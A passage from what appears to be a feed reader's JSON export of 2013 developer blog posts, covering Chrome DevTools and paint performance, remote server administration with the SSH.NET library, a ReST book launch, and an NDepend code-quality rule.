{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/gone-in-sixty-frames-per-second/","title":"Gone In 60 Frames Per Second: A Pinterest Paint Performance Case Study","published":{"$wrap":"$date","v":1371050880000,"h":"2013-06-12T15:28:00.000Z"},"starred":false,"read":false,"content":"In my new article with Paul Lewis on Smashing Magazine, we discuss how to improve the paint performance of your websites and Web apps. This is an area that we Web developers have only recently started looking at more closely, … <ahref=\"http://addyosmani.com/blog/gone-in-sixty-frames-per-second/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":971}}
{"k":"0000000082","o":"0000000812","v":"001"}
{"_id":972,"_uid":972,"_dt":1373740493931,"_s":"aa235855de1ee22b27d0a5ae4ee55850"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/author-in-es6-transpile-to-es5-as-a-build-step-a-workflow-for-grunt/","title":"Author In ES6, Transpile To ES5 As A Build-step: A Workflow For Grunt","published":{"$wrap":"$date","v":1367267202000,"h":"2013-04-29T20:26:42.000Z"},"starred":false,"read":false,"content":"Preface: This article assumes prior knowledge of Grunt, the JavaScript task runner and that you've heard of Traceur, the ES.next to ES5 transpiler by Google. Getting started guides are available for both projects. For information on the current state of … <ahref=\"http://addyosmani.com/blog/author-in-es6-transpile-to-es5-as-a-build-step-a-workflow-for-grunt/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":972}}
{"k":"0000000082","o":"0000000800","v":"001"}
{"_id":973,"_uid":973,"_dt":1373740493932,"_s":"b5cfd528dfc1e4d8ef021277a935d01b"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/taming-the-unicorn-easing-javascript-memory-profiling-in-devtools/","title":"Taming The Unicorn: Easing JavaScript Memory Profiling In Chrome DevTools","published":{"$wrap":"$date","v":1365687144000,"h":"2013-04-11T13:32:24.000Z"},"starred":false,"read":false,"content":"“The Unicorn has a special ability to help it's master when in trouble. When tamed, they will not attack humans or tamed creatures, but will attack anything else with negative karma\" The DevTools Heap Profiler and Timeline Memory view can … <ahref=\"http://addyosmani.com/blog/taming-the-unicorn-easing-javascript-memory-profiling-in-devtools/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":973}}
{"k":"0000000082","o":"0000000721","v":"001"}
{"_id":974,"_uid":974,"_dt":1373740493932,"_s":"1c855ab1f8731d42d74bbdc6fbc7ea8e"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/devtools-extensions-for-webapp-developers/","title":"DevTools Extensions For Web App Developers","published":{"$wrap":"$date","v":1364294387000,"h":"2013-03-26T10:39:47.000Z"},"starred":false,"read":false,"content":"The past year has seen many leaps made to improve developer productivity through better tooling. We're paying increasing attention to our workflow and many of us have spent time optimising our usage of tools like Grunt, Bower, Yeoman and the … <ahref=\"http://addyosmani.com/blog/devtools-extensions-for-webapp-developers/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":974}}
{"k":"0000000082","o":"0000000781","v":"001"}
{"_id":975,"_uid":975,"_dt":1373740493933,"_s":"2ae61ba937be50f174a8e0fd82cc9838"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/yeoman-update-announcing-1-0-beta-4/","title":"Yeoman Update: announcing 1.0 beta 4, Windows support, Refreshed Angular, Backbone, Ember generators and more.","published":{"$wrap":"$date","v":1365500686000,"h":"2013-04-09T09:44:46.000Z"},"starred":false,"read":false,"content":"Today we're happy to announce the release of Yeoman 1.0 beta 4. A number of large updates have been made to the project since beta 3, covering scaffolding, performance improvements and overall stability. The community around the project has also … <ahref=\"http://addyosmani.com/blog/yeoman-update-announcing-1-0-beta-4/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":975}}
{"k":"0000000082","o":"0000000811","v":"001"}
{"_id":976,"_uid":976,"_dt":1373740493934,"_s":"ec5a0ed39b3f4166535bc33c533ef9b0"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/be-careful-when-using-null-transform-hacks-to-force-gpu-acceleration/","title":"Take Care When Using Null Transform Hacks For Forcing GPU Acceleration","published":{"$wrap":"$date","v":1362917915000,"h":"2013-03-10T12:18:35.000Z"},"starred":false,"read":false,"content":"At my jQueryTO keynote on paint optimization, I mentioned the performance benefits of promoting DOM elements to a composite layer using GPU acceleration in Chrome. Moving compositing of page layers to the GPU can offer better efficiency than the CPU … <ahref=\"http://addyosmani.com/blog/be-careful-when-using-null-transform-hacks-to-force-gpu-acceleration/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":976}}
{"k":"0000000082","o":"0000000764","v":"001"}
{"_id":977,"_uid":977,"_dt":1373740493934,"_s":"72eaf0929097ef7d9a14089d1e949b3f"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/devtools-visually-re-engineering-css-for-faster-paint-times/","title":"DevTools: Visually Re-engineering CSS For Faster Paint Times","published":{"$wrap":"$date","v":1360238517000,"h":"2013-02-07T12:01:57.000Z"},"starred":false,"read":false,"content":"Increasingly, whether it’s on desktop or mobile, users want their web experience to be snappy and delightful. This means that even if the browser is busy rendering the page or loading in content, the user should still be able to … <ahref=\"http://addyosmani.com/blog/devtools-visually-re-engineering-css-for-faster-paint-times/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":977}}
{"k":"0000000082","o":"0000000764","v":"001"}
{"_id":978,"_uid":978,"_dt":1373740493934,"_s":"45264e7653e29aec665e6d9cb92ff4f1"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/tooling-for-the-modern-webapp-developer-video-from-dotjs/","title":"Tooling For The Modern WebApp Developer – Video From DotJS","published":{"$wrap":"$date","v":1359307825000,"h":"2013-01-27T17:30:25.000Z"},"starred":false,"read":false,"content":"The video from my DotJS talk in Paris is now up. I hope it's useful. In it I walk through how to performance profile your apps using DevTools Timeline and the Heap profiler, debugging your mobile apps using Overrides, sexy SASS Source … <ahref=\"http://addyosmani.com/blog/tooling-for-the-modern-webapp-developer-video-from-dotjs/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":978}}
{"k":"0000000082","o":"0000000694","v":"001"}
{"_id":979,"_uid":979,"_dt":1373740493935,"_s":"2cb20dc1c4f6e9a65dc7784eb59e937e"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/jank-busting-with-daft-punk/","title":"Jank Busting With Daft Punk","published":{"$wrap":"$date","v":1368736515000,"h":"2013-05-16T20:35:15.000Z"},"starred":false,"read":false,"content":"Yesterday, I looked at the new Daft Punk web experience on Pitchfork. It was visually stunning, featuring rich-animations throughout. I noticed however that scrolling on the page felt quite janky in Chrome. It was sluggish and stuttered regularly. You could … <ahref=\"http://addyosmani.com/blog/jank-busting-with-daft-punk/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":979}}
{"k":"0000000082","o":"0000000774","v":"001"}
{"_id":980,"_uid":980,"_dt":1373740493935,"_s":"b5755fafb5b0c769a7cc4ce1c5bd5c9c"}
{"subscription":{"$wrap":"$oid","v":9},"link":"http://addyosmani.com/blog/curated-talks-to-help-you-become-a-better-front-end-engineer-in-2013/","title":"Curated Talks To Help You Become A Better Front-End Engineer In 2013","published":{"$wrap":"$date","v":1357585105000,"h":"2013-01-07T18:58:25.000Z"},"starred":false,"read":false,"content":"  Many of us care deeply about developing our craft, but staying up to date can be a true challenge, especially when the quantity of fresh information we’re regularly exposed to can be a lot to take in. 2012 has … <ahref=\"http://addyosmani.com/blog/curated-talks-to-help-you-become-a-better-front-end-engineer-in-2013/\">Continue reading <spanclass=\"meta-nav\">→</span></a>","author":"Addy","_id":{"$wrap":"$oid","v":980}}
{"k":"0000000082","o":"0000005983","v":"001"}
{"_id":981,"_uid":981,"_dt":1373741607070,"_s":"266f3bf4654f9bea388de06bf12d53b2"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/BImVryV3_Tk/sshnet.html","title":"SSH.NET","published":{"$wrap":"$date","v":1369838940000,"h":"2013-05-29T14:49:00.000Z"},"starred":false,"read":false,"content":"<p>I’ve recently had the need to automate configuration of<a href=\"http://wiki.nginx.org/Main\">Nginx</a>on an<a href=\"http://www.ubuntu.com/\">Ubuntu</a>server. Of course, in UNIX land we like to use<a href=\"http://en.wikipedia.org/wiki/Secure_Shell\">SSH</a>(Secure Shell) to log into our servers and manage them remotely. Wouldn’t it be nice, I thought, if there was a managed SSH library somewhere so that I could automate logging onto my Ubuntu server, run various commands and transfer files. A short Google turned up<a href=\"http://sshnet.codeplex.com/\">SSH.NET</a>by the somewhat mysterious Olegkap (at least I couldn’t find out anything else about them) which turned out to be just what I wanted. Here’s the blurb on the CodePlex site:</p><blockquote><p><em>“This project was inspired by Sharp.SSH library which was ported from java and it seems like was not supported for quite some time. This library is complete rewrite using .NET 4.0, without any third party dependencies and to utilize the parallelism as much as possible to allow best performance I can get.”</em></p></blockquote><p>It does exactly what it says on the tin. It’s on<a href=\"http://nuget.org/packages/SSH.NET/\">NuGet</a>, so you can grab it with:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">PM&gt; Install-Package SSH.NET</pre><br /></div><p>Here’s how you run a remote command. First you need to build a ConnectionInfo object:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">public ConnectionInfo CreateConnectionInfo()<br />{<br />const string privateKeyFilePath = @\"C:\\some\\private\\key.pem\";<br />ConnectionInfo connectionInfo;<br />using (var stream = new FileStream(privateKeyFilePath, FileMode.Open, FileAccess.Read))<br />{<br />var privateKeyFile = new PrivateKeyFile(stream);<br />AuthenticationMethod authenticationMethod =<br />new PrivateKeyAuthenticationMethod(\"ubuntu\", privateKeyFile);<br /><br />connectionInfo = new ConnectionInfo(<br />\"my.server.com\",<br />\"ubuntu\",<br />authenticationMethod);<br />}<br /><br />return connectionInfo;<br />}</pre><br /></div><p>Then you simply create an SshClient instance and run commands:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">public void Connect()<br />{<br />using (var ssh = new SshClient(CreateConnectionInfo()))<br />{<br />ssh.Connect();<br />var command = ssh.CreateCommand(\"uptime\");<br />var result = command.Execute();<br />Console.Out.WriteLine(result);<br />ssh.Disconnect();<br />}<br />}</pre><br /></div><p>Here I’m running the ‘uptime’ command which output this when I ran it just now:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">14:37:46 up 22 days,  3:59,  0 users,  load average: 0.08, 0.03, 0.05</pre><br /></div><p>To transfer a file, just use the ScpClient:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #0000ff\">public</span><span style=\"color: #0000ff\">void</span>GetConfigurationFiles()<br />{<br /><span style=\"color: #0000ff\">using</span>(var scp =<span style=\"color: #0000ff\">new</span>ScpClient(CreateNginxServerConnectionInfo()))<br />{<br />scp.Connect();<br /><br />scp.Download(<span style=\"color: #006080\">\"/etc/nginx/\"</span>,<span style=\"color: #0000ff\">new</span>DirectoryInfo(<span style=\"color: #006080\">@\"D:\\Temp\\ScpDownloadTest\"</span>));<br /><br />scp.Disconnect();<br />}<br />}</pre><br /></div><p></p><p></p><p></p><p>Which grabs all my Nginx configuration and transfers it to a directory tree on my windows machine.</p><p>All in all a very nice little library that’s been working well for me so far. Give it a try if you need to interact with a UNIX-like machine from .NET code.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":981}}
{"k":"0000000082","o":"0000003677","v":"001"}
{"_id":982,"_uid":982,"_dt":1373741607071,"_s":"3e79724d11923c8708933960da2613ec"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/qkIUmK_J4Ow/","title":"Relaunching SerialSeb – Practical ReST and then some","published":{"$wrap":"$date","v":1365921025000,"h":"2013-04-14T06:30:25.000Z"},"starred":false,"read":false,"content":"<p>Well. After 5 months of soul-searching, ups and downs, I’m back, more focused than ever (think laser beam focus). This week has seen the launch of several important projects for me, and I’m very excited to share them with you, a year after my last blog post! The hiatus is over and Seb is back.</p><h1>Practical ReST – the book</h1><p>I’ve been talking for years about writing a brain dump of what I know of ReST. The project has started, you can pledge to <a href=\"http://kickstarter.com/projects/serialseb/practical-rest-building-hypermedia-systems\">buy your copy today</a> (in various editions) and get content as early as next month!</p><p>The response has been amazing, with three quarters of the minimum funding pledged in 48 hours. Of course, the more contributors the more time I can allocate to the book, the quicker the book will be in your hands, so don’t hesitate!</p><p>Writing a book in itself is a big challenge, and the scope is very ambitious. But it’s also a foray into self-publishing, and I expect it to be an amazing opportunity for learning.</p><h1>Practical ReST – the class</h1><p>I’ve been giving a ReST class for a while, but I’m rewriting it so it follows the same structure as the book, and make it open to people with many technological backgrounds.</p><p>First date should be in <a href=\"http://serialseb.com/rest/2013/04/09/London-class-May-2013.html\">May in London</a>, and I expect <a href=\"http://serialseb.com/rest/2013/04/12/Warsaw-class-planned.html\">Warsaw</a>, Vilnius and other locations to pop up this year.</p><p>If you want to see a workshop organised in your city (or your company), pop me an email.</p><p>I’m also launching a referral program *and* group rebates, so if you’re a training company and you want to add the course to your books, you can too.</p><h1>Hanselminutes podcast</h1><p>Scott was nice enough to have me on his show this week, talking about Practical ReST. It’s <a href=\"http://www.hanselminutes.com/366/practical-rest-with-sebastien-lambla\">published and ready to be listened to</a>, and while I was half-way through an asthma attack and having microphone problems, Scott saves the day by being a great host.</p><h1><a href=\"http://www.cancerresearchuk.org/home/\">Cancer Research UK</a></h1><p>You may remember that I asked for your contributions to help me raise money for cancer research UK. I can now announced that we raised more than 700£, and that both my objectives of non-drinking were achieved. I cannot thank you all enough for your generosity.</p><h1><a href=\"http://serialseb.com\">serialseb.com</a></h1><p>It had to happen. I now have my own web site. You cannot imagine how difficult it is for me to put work and effort in talking about what I did rather than what I want to do. But you will find on there a link to <a href=\"http://serialseb.com/speaker/\">all my previous talks</a>, with videos and slides (where applicable), as well as where you’ll find me next, my future talks and where classes will be delivered next.</p><h1>What next?</h1><p>ReST will be my focus for the next few months. I have a couple of other projects up my sleeve, but this is enough announcements for now, don’t you think?</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/qkIUmK_J4Ow\" height=\"1\" width=\"1\"/>","author":"Sebastien Lambla","_id":{"$wrap":"$oid","v":982}}
{"k":"0000000082","o":"0000016894","v":"001"}
{"_id":983,"_uid":983,"_dt":1373741607071,"_s":"a43f0752a57d1f3773b62cbd24cc97e1"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/BOXC6YmI2J4/","title":"Don’t assign a field from many methods","published":{"$wrap":"$date","v":1368460419000,"h":"2013-05-13T15:53:39.000Z"},"starred":false,"read":false,"content":"<p>For the next NDepend version, amongst plenty of cool stuff, a new default code rule will be added. It has been named <strong>Don’t assign a field from many methods</strong>. It falls into the category of <strong>Purity – Immutability – Side-Effects</strong> rules, one of my preferred set of rules since often hard-to-find and to-fix bugs come from wrong state managements.</p><p><a href=\"http://codebetter.com/patricksmacchia/files/2013/05/Screenshot2.png\"><img class=\"alignnone size-full wp-image-793\" title=\"Purity - Immutability - Side-Effects code rules\" alt=\"Screenshot2\" src=\"http://codebetter.com/patricksmacchia/files/2013/05/Screenshot2.png\" width=\"600\" height=\"292\" /></a></p><p>As its name suggests this rule matches fields assigned from multiple methods. Bugs due to corrupted state are often the consequence of fields anarchically assigned.</p><p>On many code bases tested, I found the threshold of 4 methods writer to be the best balanced number between too many false positives, and a decent amount of suspicious matches to look after at code-reviewing time. Of course this threshold is easily customizable.</p><p>Several parameters can be taken account.</p><ul><li>Is the field static? in which case it can be pretty serious if many methods assign it.</li><li>Does the field type is a value or a reference type? In the case of a reference type, such situation might reveal a potential <em>NullReferenceException</em> scenario luring.</li><li>Is the field assigned outside from its class. Since another rule prevents fields to be visible from outside its class, this case has been eliminated.</li><li>How many assigner methods of the parent class are visible outside the class? How many  methods calling directly or indirectly an assigner method are visible outside the class?</li><li>Can a particular class instance be accessed from multiple threads? in which case the situation sounds pretty alarming.</li></ul><p>Not all cases are taken account since static analysis have limits and for code review warning purposes the rule algorithm must be kept easily understandable. Here is the rule code and comments that contain insight about how to generally fix such issue.</p><p>I’d be curious to read your suggestions and comments on that.</p><script src=\"http://gist.github.com/5569350.js\"></script><noscript><link rel=\"stylesheet\" href=\"https://gist.github.com/assets/embed-bfcadee384027982121fdeb9930e78b2.css\"><div id=\"gist5569350\" class=\"gist\"><div class=\"gist-file\"><div class=\"gist-data gist-syntax\"><div class=\"file-data\"><table cellpadding=\"0\" cellspacing=\"0\" class=\"lines highlight\"><tr><td class=\"line-numbers\"><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L1\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L1\">1</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L2\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L2\">2</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L3\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L3\">3</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L4\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L4\">4</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L5\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L5\">5</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L6\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L6\">6</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L7\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L7\">7</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L8\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L8\">8</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L9\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L9\">9</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L10\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L10\">10</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L11\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L11\">11</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L12\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L12\">12</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L13\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L13\">13</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L14\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L14\">14</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L15\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L15\">15</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L16\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L16\">16</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L17\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L17\">17</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L18\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L18\">18</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L19\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L19\">19</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L20\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L20\">20</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L21\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L21\">21</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L22\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L22\">22</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L23\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L23\">23</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L24\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L24\">24</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L25\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L25\">25</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L26\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L26\">26</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L27\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L27\">27</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L28\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L28\">28</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L29\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L29\">29</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L30\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L30\">30</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L31\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L31\">31</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L32\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L32\">32</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L33\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L33\">33</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L34\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L34\">34</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L35\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L35\">35</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L36\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L36\">36</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L37\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L37\">37</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L38\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L38\">38</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L39\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L39\">39</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L40\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L40\">40</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L41\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L41\">41</span><span class=\"line-number\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L42\" rel=\"file-cqlinq-don-t-assign-a-field-from-many-methods-L42\">42</span></td><td class=\"line-data\"><pre class=\"line-pre\"><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC1\">// &lt;Name&gt;Don't assign a field from many methods&lt;/Name&gt;</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC2\">warnif count &gt; 0 </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC3\">from f in JustMyCode.Fields where </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC4\">  !f.IsEnumValue &&</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC5\">  !f.IsImmutable && </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC6\">  !f.IsInitOnly &&</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC7\">  !f.IsGeneratedByCompiler &&</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC8\">  !f.IsEventDelegateObject &&</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC9\">   (f.IsPrivate || f.IsProtected)  // Don't match fields assigned outside their classes.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC10\"> </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC11\">// The threshold 4 is arbitrary and it should avoid matching too many fields.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC12\">// Threshold is even lower for static fields because this reveals situations even more complex.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC13\">where f.MethodsAssigningMe.Count() &gt;= (!f.IsStatic ? 4 : 2)</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC14\">select new { f, </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC15\">             f.MethodsAssigningMe, </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC16\">             f.MethodsReadingMeButNotAssigningMe, </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC17\">             f.MethodsUsingMe,</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC18\">             f.ParentType } </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC19\"> </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC20\">// A field assigned from many methods is a symptom of bug-prone code.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC21\">// This situation makes harder to anticipate the field state during runtime.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC22\">// The code is then hard to read, hard to debug and hard to maintain.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC23\">// Hard-to-solve bugs due to corrupted state are often the consequence of fields anarchically assigned.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC24\">//</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC25\">// The situation is even more complex if the field is static.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC26\">// Indeed, this potentially involves global random accesses from different parts of the application.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC27\">// This is why this rule provides a lower threshold for static fields.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC28\">// </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC29\">// If the object containing such field is meant to be used from multiple threads, </div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC30\">// there are alarming chances that the code is unmaintainable and bugged.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC31\">// When multiple threads are involved, the rule of thumb is to use immutable objects.</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC32\">//</div><div class=\"line\" id=\"file-cqlinq-don-t-assign-a-field-from-many-methods-LC33\">// If the field type is a reference type (interfaces, 